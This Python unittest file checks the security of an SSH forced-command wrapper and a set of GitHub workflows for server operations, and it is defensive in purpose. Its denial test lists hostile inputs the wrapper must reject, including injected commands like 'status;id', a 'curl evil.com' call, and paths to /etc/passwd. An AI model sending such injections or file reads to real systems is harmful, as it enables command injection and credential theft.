"""Offline security regression checks for the bounded server-ops proof of concept."""
import os
from pathlib import Path
import subprocess
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[2]
WRAPPER = ROOT / "ops/server/ca-ops-command"
BOOTSTRAP = ROOT / "ops/server/bootstrap.sh"
UPGRADE = ROOT / "ops/server/upgrade.sh"
ENABLE_WRITE = ROOT / "ops/server/enable-write.sh"
STAGE_SCRIPT = ROOT / "ops/server/stage_commit.sh"
INSTALL_PUBLISH = ROOT / "ops/server/enable-landing-publish.sh"
PUBLISH = ROOT / "ops/server/publish_lehrstellen.py"
WORKFLOW = ROOT / ".github/workflows/controlled-server-ops.yml"
DISPATCHER_INSTALL = ROOT / "ops/server/install-ops-dispatcher.sh"
AUTH_INSTALL = ROOT / "ops/production/install-auth-preflight.sh"
RELEASE_INSTALL = ROOT / "ops/production/install-release-gateway.sh"


class ServerOpsSecurityTests(unittest.TestCase):
    def test_shell_syntax(self):
        for script in (WRAPPER, BOOTSTRAP, UPGRADE, ENABLE_WRITE, STAGE_SCRIPT,
                       INSTALL_PUBLISH, DISPATCHER_INSTALL, AUTH_INSTALL, RELEASE_INSTALL):
            with self.subTest(script=script.name):
                subprocess.run(["bash", "-n", str(script)], check=True)

    def test_dangerous_ssh_commands_denied(self):
        for command in (
            "", "bash", "/bin/sh", "sudo id", "status;id",
            "tests;id", "test", "status\nwhoami", "deploy", "crawler-import",
            "feed-audit;id", "feed-audit --path /etc/passwd",
            "crawler-probe;curl evil.com", "release-check && id", "crawler-sync",
            "stage", "stage 000", "stage " + "a"*39 + "Z",
            "stage " + "f"*40 + ";id", "stage " + "e"*41,
            "publish-lehrstellen --force", "publish-lehrstellen;id",
            "auth-preflight --debug", "auth-preflight;id",
            "release-deploy", "release-check ", "release-deploy xyz",
            "release-deploy " + "a"*40 + ";id",
            "release-rollback", "release-rollback ../etc/passwd",
            "release-rollback 20261107T120000Z-000000000000;id",
        ):
            with self.subTest(command=command):
                proc = subprocess.run(
                    ["bash", str(WRAPPER)],
                    env={**os.environ, "SSH_ORIGINAL_COMMAND": command},
                    text=True, capture_output=True, timeout=5,
                )
                self.assertEqual(proc.returncode, 64)
                self.assertIn("Denied", proc.stderr)

    def test_auth_preflight_uses_active_release_path(self):
        preflight = (ROOT / "ops/production/auth-preflight.sh").read_text()
        self.assertIn("/opt/careeragency/auth-current/authservice", preflight)
        self.assertNotIn("/opt/careeragency/authservice", preflight)

    def test_unified_release_workflow_has_scoped_operations(self):
        workflow = (ROOT / ".github/workflows/careeragency-production.yml").read_text()
        for operation in ("frontend-check", "frontend-deploy", "frontend-rollback",
                          "radar-check", "radar-deploy", "radar-rollback"):
            self.assertIn(operation, workflow)
        self.assertIn("github.event.issue.user.id == 343900642", workflow)
        self.assertIn("CA-RELEASE: ", workflow)
        self.assertIn("cancel-in-progress: false", workflow)
        self.assertIn("StrictHostKeyChecking=yes", workflow)
        self.assertIn("Rollback failed Radar deploy", workflow)
        self.assertIn("smoke-production.py", workflow)
        self.assertNotIn("\\${{", workflow)

    def test_issue_titles_and_actor_are_hard_coded(self):
        yaml_text = WORKFLOW.read_text()
        self.assertIn("github.event.issue.user.id == 343900642", yaml_text)
        self.assertIn("github.event.issue.title == 'CA-OPS: status'", yaml_text)
        self.assertIn("github.event.issue.title == 'CA-OPS: tests'", yaml_text)
        for operation in ("feed-audit", "crawler-probe", "release-check", "publish-lehrstellen"):
            self.assertIn("github.event.issue.title == 'CA-OPS: " + operation + "'", yaml_text)
        self.assertIn("github.repository == 'Coco1the8creator7/bewerbungs-agent'", yaml_text)
        self.assertIn("permissions:\n  contents: read", yaml_text)
        self.assertNotIn("pull_request_target:", yaml_text)
        self.assertNotIn("GITHUB_TOKEN:", yaml_text)
        self.assertIn("StrictHostKeyChecking=yes", yaml_text)
        self.assertIn("ssh-keygen -F", yaml_text)
        self.assertIn("environment: careeragency-ops", yaml_text)
        self.assertIn("startsWith(github.event.issue.title, 'CA-OPS: stage ')", yaml_text)
        self.assertIn("inputs.operation == 'stage'", yaml_text)
        self.assertIn("remote_command=stage %s", yaml_text)
        self.assertIn("^[0-9a-f]{40}$", yaml_text)

    def test_forced_command_without_sudo(self):
        bootstrap = BOOTSTRAP.read_text()
        wrapper = WRAPPER.read_text()
        self.assertIn('AUTH_LINE="restrict,command=', bootstrap)
        self.assertIn("careeragency_runner", bootstrap)
        executable_lines = "\n".join(
            line for line in wrapper.splitlines()
            if not line.lstrip().startswith("#")
        )
        permitted = (
            "sudo -n /usr/local/sbin/careeragency-publish-lehrstellen",
            "sudo -n /usr/local/sbin/careeragency-auth-preflight",
            'sudo -n /usr/local/sbin/careeragency-release "$mode" "$argument"',
            'sudo -n /usr/local/sbin/careeragency-production "${operation#production-}" "$sha"',
            'sudo -n /usr/local/sbin/careeragency-radar-release "${operation#radar-release-}" "$argument"',
        )
        for command in permitted:
            self.assertEqual(executable_lines.count(command), 1)
            executable_lines = executable_lines.replace(command, "")
        self.assertNotIn("sudo ", executable_lines)
        self.assertNotIn("eval ", wrapper)
        self.assertNotIn("exec $", wrapper)
        self.assertNotIn("workflow_dispatch:", wrapper)
        self.assertNotIn("systemctl reload", wrapper)
        self.assertNotIn("reset --hard", wrapper)
        self.assertNotIn("--commit-test-db", wrapper)
        self.assertNotIn("psycopg", wrapper)
        self.assertNotIn("systemctl restart", wrapper)
        self.assertIn("/usr/local/lib/careeragency-ops/stage_commit.sh", wrapper)
        self.assertNotIn("rm -rf /var/www", wrapper)
        self.assertIn("expected_sha=1fdff1b1c17feb21332c83bce66bb262788eb370", wrapper)
        self.assertIn("git -C \"$workdir/repo\" rev-parse HEAD", wrapper)
        self.assertIn("timeout 60s python3 -m crawler.yousty_probe", wrapper)
        self.assertIn("python3 /usr/local/lib/careeragency-ops/feed_audit.py", wrapper)
        self.assertIn("cmp -s", wrapper)
        self.assertIn("NOPASSWD: /usr/local/sbin/careeragency-publish-lehrstellen",
                      INSTALL_PUBLISH.read_text())
        self.assertNotIn("NOPASSWD: ALL", INSTALL_PUBLISH.read_text())


    def test_privileged_routes_validate_arguments_before_sudo(self):
        # Replace only the final privileged exec for isolated parser tests.
        # No sudo commands or production files are used in this test.
        wrapper = WRAPPER.read_text().replace(
            'exec sudo -n /usr/local/sbin/careeragency-release "$mode" "$argument"',
            'printf "routed=%s:%s\\n" "$mode" "$argument"')
        wrapper = wrapper.replace(
            "exec sudo -n /usr/local/sbin/careeragency-auth-preflight",
            'printf "routed=auth-preflight\\n"')
        cases = {
            "auth-preflight": "routed=auth-preflight",
            "release-check " + "a"*40: "routed=check:" + "a"*40,
            "release-deploy " + "b"*40: "routed=deploy:" + "b"*40,
            "release-rollback 20261107T120000Z-abcdef012345":
                "routed=rollback:20261107T120000Z-abcdef012345",
        }
        for request, expected in cases.items():
            with self.subTest(request=request):
                proc = subprocess.run(
                    ["bash", "-c", wrapper],
                    env={**os.environ, "SSH_ORIGINAL_COMMAND": request},
                    capture_output=True, text=True, timeout=5)
                self.assertEqual(proc.returncode, 0, proc.stderr)
                self.assertEqual(proc.stdout.strip(), expected)

    def test_feature_installers_never_modify_dispatcher_directly(self):
        installers = (BOOTSTRAP, UPGRADE, ENABLE_WRITE, INSTALL_PUBLISH,
                      AUTH_INSTALL, RELEASE_INSTALL)
        for path in installers:
            with self.subTest(path=path.name):
                content = path.read_text()
                self.assertIn("install-ops-dispatcher.sh", content)
                self.assertNotIn("p.write_text(", content)
                self.assertNotIn("ca-ops-command.new", content)
                self.assertNotIn("forced-command-$ts", content)
                self.assertNotIn("forced-command-before-auth-preflight", content)
        shared = DISPATCHER_INSTALL.read_text()
        self.assertIn('bash -n "$src"', shared)
        self.assertIn('cmp -s "$src" "$dest"', shared)
        self.assertIn('cp -p -- "$dest" "$previous"', shared)
        self.assertIn('mv -f -- "$candidate" "$dest"', shared)
        self.assertIn('previous_dispatcher_backup=', shared)
        self.assertIn('unexpected = installed - known', shared)
        self.assertIn('unrecognized installed SSH actions', shared)
        self.assertNotIn("NOPASSWD: ALL", shared)


if __name__ == "__main__":
    unittest.main()
